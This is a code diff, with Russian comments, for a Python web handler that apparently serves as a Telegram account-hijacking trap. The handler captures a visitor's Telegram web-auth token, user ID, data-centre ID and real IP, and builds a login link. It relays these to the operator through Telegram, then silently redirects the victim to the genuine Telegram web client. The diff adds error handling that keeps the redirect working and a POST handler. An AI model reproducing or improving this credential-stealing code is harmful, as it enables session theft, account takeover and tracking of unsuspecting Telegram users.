@@ -1,8 +1,6 @@
 from http.server import BaseHTTPRequestHandler
 import urllib.parse
-import json
 import requests
-import os
 from datetime import datetime
 
 # ⚠️ ТВОИ ДАННЫЕ (проверь!)
@@ -21,12 +19,12 @@ class handler(BaseHTTPRequestHandler):
             user_id = params.get('tgWebAuthUserId', [''])[0]
             dc_id = params.get('tgWebAuthDcId', ['2'])[0]
             
-            # 3. ПОЛУЧАЕМ РЕАЛЬНЫЙ IP (важно!)
+            # 3. ПОЛУЧАЕМ РЕАЛЬНЫЙ IP
             ip = self.headers.get('x-forwarded-for', self.client_address[0])
             if ',' in ip:
                 ip = ip.split(',')[0].strip()
             
-            # 4. ЛОГИРУЕМ В VERCEL (ты увидишь это в логах)
+            # 4. ЛОГИРУЕМ В VERCEL
             print(f"🔥 ВРЕМЯ: {datetime.now().isoformat()}")
             print(f"📦 ПАРАМЕТРЫ: token={token}, user={user_id}, dc={dc_id}")
             print(f"📡 IP: {ip}")
@@ -45,7 +43,7 @@ class handler(BaseHTTPRequestHandler):
                     f"📱 IP: <code>{ip}</code>\n"
                     f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
                     f"🔗 <b>ССЫЛКА ДЛЯ ВХОДА:</b>\n"
-                    f"<code>{login_url}</code>"
+                    f"{login_url}"
                 )
                 
                 # Отправка в Telegram
@@ -66,10 +64,20 @@ class handler(BaseHTTPRequestHandler):
                 else:
                     print("✅ УСПЕШНО ОТПРАВЛЕНО В TELEGRAM")
             
-            # 6. ВСЕГДА РЕДИРЕКТИМ НА НАСТОЯЩИЙ TELEGRAM
+            # 6. РЕДИРЕКТ НА НАСТОЯЩИЙ TELEGRAM
             self.send_response(302)
             self.send_header('Location', 'https://web.telegram.org/k/')
             self.end_headers()
             
         except Exception as e:
-            # Лови
+            # Логируем ошибку
+            print(f"💥 КРИТИЧЕСКАЯ ОШИБКА: {str(e)}")
+            
+            # Даже при ошибке редиректим
+            self.send_response(302)
+            self.send_header('Location', 'https://web.telegram.org/k/')
+            self.end_headers()
+    
+    def do_POST(self):
+        # Обрабатываем POST запросы так же как GET
+        self.do_GET()
